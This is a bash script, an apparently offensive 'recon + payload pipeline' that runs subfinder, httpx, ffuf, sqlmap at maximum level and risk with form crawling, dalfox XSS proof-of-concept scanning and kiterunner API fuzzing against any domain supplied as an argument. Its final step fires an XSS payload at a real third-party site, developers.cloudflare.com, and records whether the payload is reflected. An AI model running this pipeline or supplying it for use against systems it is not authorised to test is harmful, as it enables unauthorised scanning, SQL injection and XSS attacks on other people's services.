#!/bin/bash

# === Sovereign Recon + Payload Pipeline (Cloudflare Enhanced) ===

TARGET=$1
WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
OUTPUT_DIR="recon-output"

echo "[*] Starting recon on $TARGET"
mkdir -p $OUTPUT_DIR

# 1. Subdomain Enumeration
echo "[*] Running subfinder..."
subfinder -d $TARGET -silent > $OUTPUT_DIR/subdomains.txt

# 2. Live Host Probing
echo "[*] Probing with httpx..."
cat $OUTPUT_DIR/subdomains.txt | httpx -status-code -title > $OUTPUT_DIR/live_hosts.txt

# 3. Directory/Endpoint Fuzzing
echo "[*] Running ffuf on main domain..."
ffuf -u https://$TARGET/FUZZ -w $WORDLIST -o $OUTPUT_DIR/ffuf_results.json -of json

# 4. SQL Injection Surface Discovery
echo "[*] Running SQLMap on suspected parameter..."
sqlmap -u "https://$TARGET/page.php?id=1" --batch --level=5 --risk=3 --crawl=2 --forms --output-dir=$OUTPUT_DIR/sqlmap

# 5. XSS Scanning with Dalfox
echo "[*] Running Dalfox XSS scan..."
dalfox file $OUTPUT_DIR/ffuf_results.json --format json --only-poc --output $OUTPUT_DIR/dalfox_xss.txt

# 6. IDOR Detection Prep (API)
echo "[*] Running Kiterunner for API fuzzing..."
kr scan -u https://$TARGET -w routes-large.kite > $OUTPUT_DIR/kiterunner.txt

# 7. Cloudflare XSS PoC Injection and Reflection Report
echo "[*] Testing Cloudflare for reflected XSS..."
TEST_URL="https://developers.cloudflare.com/?q=<svg/onload=alert(1337)>"
curl -s $TEST_URL | grep -q "<svg/onload=alert(1337)>" && echo "[!] Reflection found in response: $TEST_URL" >> $OUTPUT_DIR/xss_reflection_report.txt

echo "[✓] Recon + Payload pipeline complete. Check $OUTPUT_DIR for results."
